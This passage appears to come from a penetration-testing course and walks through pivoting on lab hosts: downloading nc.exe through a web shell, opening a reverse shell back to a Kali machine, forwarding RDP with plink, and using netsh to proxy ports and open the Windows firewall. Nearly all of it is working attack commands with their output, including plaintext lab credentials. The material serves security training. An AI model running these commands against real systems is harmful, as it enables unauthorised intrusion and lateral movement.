### Copying `nc.exe` to the Apache2 Web Root

To copy `nc.exe` to the Apache2 web root, first locate the file using the `find` command:

```bash
kali@kali:~$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
```

Once located, use `sudo cp` to copy it to the web root directory:

```bash
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

**Listing 566: Copying `nc.exe` to the Apache2 web root.**

After the executable is in the web root, you can download it to `MULTISERVER03` using a PowerShell one-liner from the web shell.

### Downloading `nc.exe` to `MULTISERVER03`

From the web shell, run the following PowerShell command to download `nc.exe` from the Kali machine's web server and save it to `C:\Windows\Temp` on `MULTISERVER03`:

```powershell
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

**Listing 567: The PowerShell command to download `nc.exe` to `MULTISERVER03` through the web shell.**

Once the download is complete, set up a Netcat listener on port 4446 on the Kali machine:

```bash
kali@kali:~$ nc -nvlp 4446
listening on [any] 4446 ...
```

**Listing 568: The Netcat listener on the Kali machine.**

Next, execute `nc.exe` on `MULTISERVER03` using the web shell, passing `-e` to execute `cmd.exe` once the connection is established:

```cmd
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

**Listing 569: The `nc.exe` reverse shell payload executed in the web shell.**

The shell will connect to the Netcat listener on the Kali machine:

```bash
listening on [any] 4446 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
Microsoft Windows [Version 10.0.20348.825]
(c) Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>
```

**Listing 570: The shell from `nc.exe` caught by the Netcat listener.**

### Downloading `plink.exe` to `MULTISERVER03`

To download `plink.exe` to `MULTISERVER03`, first locate the file on the Kali machine:

```bash
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

Copy `plink.exe` to the Apache2 web root:

```bash
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali:
```

**Listing 571: Copying `plink.exe` to the Apache2 web root.**

In the reverse shell, use the PowerShell one-liner to download `plink.exe` from the Kali machine to `C:\Windows\Temp` on `MULTISERVER03`:

```powershell
c:\windows\system32\inetsrv> powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

**Listing 572: `Plink` downloaded to the `C:\Windows\Temp` folder.**

### Setting Up Plink with Remote Port Forwarding

With `plink.exe` downloaded to `MULTISERVER03`, set up a remote port forward to access the RDP port from the Kali machine. Use the following command:

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

**Listing 573: Making an SSH connection to the Kali machine.**

If prompted to store the host key, respond with `y` to add the key to the cache. You may need to automate this confirmation if using a restricted shell:

```cmd
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

Confirm that the port has opened on the Kali machine using `ss`:

```bash
kali@kali:~$ ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:9833 0.0.0.0:*
...
```

**Listing 574: Port 9833 opened on the Kali loopback interface.**

Now, connect to port 9833 on the Kali loopback interface with `xfreerdp` as the `rdp_admin` user:

```bash
kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
...
Do you trust the above certificate? (Y/T/N) y
...
```

**Listing 575: Connecting to the RDP server with `xfreerdp`, through the Plink port forward.**

### Using Netsh for Port Forwarding

To create a port forward on `MULTISERVER03` using the built-in `Netsh` tool, follow these steps:

1. **Connect to `MULTISERVER03` via RDP:**

    ```bash
    kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
    ...
    ```

    **Listing 576: Connecting to the RDP server with `xfreerdp`.**

2. **Run `cmd.exe` as administrator and add a port proxy rule:**

    ```cmd
    C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
    ```

    **Listing 577: The `portproxy` command being run.**

3. **Verify the port is listening:**

    ```cmd
    C:\Windows\system32> netstat -anp TCP | find "2222"
    TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING
    ```

    **Listing 578: `netstat` showing that TCP/2222 is listening on the external interface.**

4. **List all port proxy rules:**

    ```cmd
    C:\Windows\system32> netsh interface portproxy show all
    Listen on ipv4: Connect to ipv4:
    Address Port Address Port
    --------------- ---------- --------------- ----------
    192.168.50.64 2222 10.4.50.215 22
    ```

    **Listing 579: Listing all the `portproxy` port forwarders set up with `Netsh`.**

5. **Check the port from the Kali machine:**

    ```bash
    kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:27 EDT
    Nmap scan report for 192.168.50.64
    Host is up (0.00055s latency).
    PORT STATE SERVICE
    2222/tcp filtered EtherNetIP-1
    MAC Address: 00:0C:29:A9:9F:3D (VMware)
    Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
    ```

    **Listing 580: `Nmap` showing that port 2222 on `MULTISERVER03` is filtered.**

6. **Create a firewall rule to allow inbound connections:**

    ```cmd
    C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
    Ok.
    ```

    **Listing 581: Poking a hole in the Windows Firewall with `Netsh`.**

7. **Recheck the port from the Kali machine:**

    ```bash
    kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
    ```

This completes the setup of the port forward and the necessary firewall rule to allow access.